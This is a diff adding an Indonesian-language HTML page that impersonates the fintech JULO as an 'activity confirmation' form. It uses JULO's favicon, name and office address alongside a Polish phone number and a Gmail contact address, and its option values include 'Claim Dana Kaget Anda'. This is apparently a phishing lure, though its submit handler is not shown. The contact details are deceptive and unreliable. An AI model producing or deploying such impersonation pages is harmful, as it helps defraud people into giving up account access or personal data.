@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://julo.co.id/themes/julo_v2/favicon.ico" />
+    <link rel="icon" sizes="32x32" href="https://julo.co.id/themes/julo_v2/favicon.ico" />
+    <link rel="icon" sizes="96x96" href="https://julo.co.id/themes/julo_v2/favicon.ico" />
+    <link rel="icon" sizes="192x192" href="https://julo.co.id/themes/julo_v2/favicon.ico" />
+    <title>Form Konfirmasi Aktivitas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #00a2ffba;
+            margin: 0;
+            padding: 0;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #0086e0;
+            padding: 10px 20px;
+            color: white;
+        }
+
+        .navbar h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 700px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .panel {
+            border-radius: 13px;
+            padding: 20px;
+            margin-top: -20px;
+            background-color: #1190ea89;
+        }
+
+        .panel h5 {
+            margin: 10px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #118EEA;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .panel label {
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .panel input[type="radio"] {
+            margin-right: -220px;
+        }
+
+        .btn-punya {
+            background-color: #0086e0;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn-punya:hover {
+            background-color: #005bb5;
+        }
+
+        .contact {
+            margin-top: 120px;
+            text-align: left;
+            font-size: 16px;
+        }
+
+        .contact p {
+            margin: 5px 0;
+           
+        }
+
+        .hb {
+            font-size: 24px;
+            font-style: bold;
+            color: aqua;
+            height: 30px;
+        }
+
+    
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <h1>JULO Aktivitas</h1>
+    </div>
+    <div class="container">
+        <div class="header-image"></div>
+        <div class="content">
+            <form onsubmit="formsaya(); return false" method="post" id="formsaya" action="index.html">
+                <div class="panel">
+                    <legend>
+                        <h5>SILAHKAN KONFIRMASI AKTIVITAS DI AKUN JULO KAMU</h5>
+                        <div>
+                            <input type="radio" id="baru" name="tarif" value="Claim Dana Kaget Anda" checked>
+                            <label for="baru">
+                                Saya yang melakukan aktivitas
+                            </label>
+                        </div>
+                        <div>
+                            <input type="radio" id="lama" name="tarif" value="Laporkan Kendala Akun">
+                            <label for="lama">
+                                Saya tidak melakukan aktivitas
+                            </label>
+                        </div>
+                    </legend>
+                </div>
+                <br>
+                <button class="btn-punya" type="submit" value="send">Konfirmasi</button>
+            </form>
+            <div class="contact">
+                <h2 class="hb">Hubungi Kami</h2>
+                <h4 class="hb-p">Kontak Kami</h4>
+                <p>Telepon: +48 699 515 858</p>
+                <p>Email: infojulo@gmail.com</p>
+            </div>
+            <div class="contact">
+                <h3 class="hb-p">Kantor Kami</h3>
+                <p>PT. JULO Teknologi Finansial 88@Kasablanka Tower A Lantai 5. Jl. Raya Casablanca Kav.88, Jakarta Selatan 12870</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
